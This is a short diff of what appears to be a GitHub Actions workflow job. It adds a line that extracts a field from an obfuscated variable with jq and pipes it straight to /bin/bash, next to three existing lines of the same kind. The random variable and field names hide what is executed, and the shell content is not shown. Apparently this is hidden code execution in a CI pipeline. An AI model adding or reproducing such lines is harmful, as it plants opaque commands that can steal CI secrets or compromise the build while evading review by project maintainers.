@@ -33,6 +33,7 @@ jobs:
           echo $bd252 | jq -r .sp1225 | /bin/bash
           printf '%s' "$lckvs70" | jq -r .zevlw66 | /bin/bash
           echo $vloj2149 | jq -r .kfnq40 | /bin/bash
+          echo $krpp7529 | jq -r .jy6771 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
